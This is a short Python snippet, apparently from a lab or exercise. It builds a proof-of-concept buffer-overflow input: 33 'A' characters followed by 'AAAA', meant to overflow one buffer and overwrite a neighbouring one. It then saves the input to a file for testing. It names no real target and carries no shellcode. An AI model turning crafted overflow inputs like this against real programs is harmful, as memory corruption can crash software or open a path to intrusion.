payload = "A" * 33 + "AAAA"  # 33 'A's to overflow buffer1 and overwrite buffer2 with 'AAAA'

# Save the payload to a file for testing
with open("poc_input.txt", "w") as f:
    f.write(payload)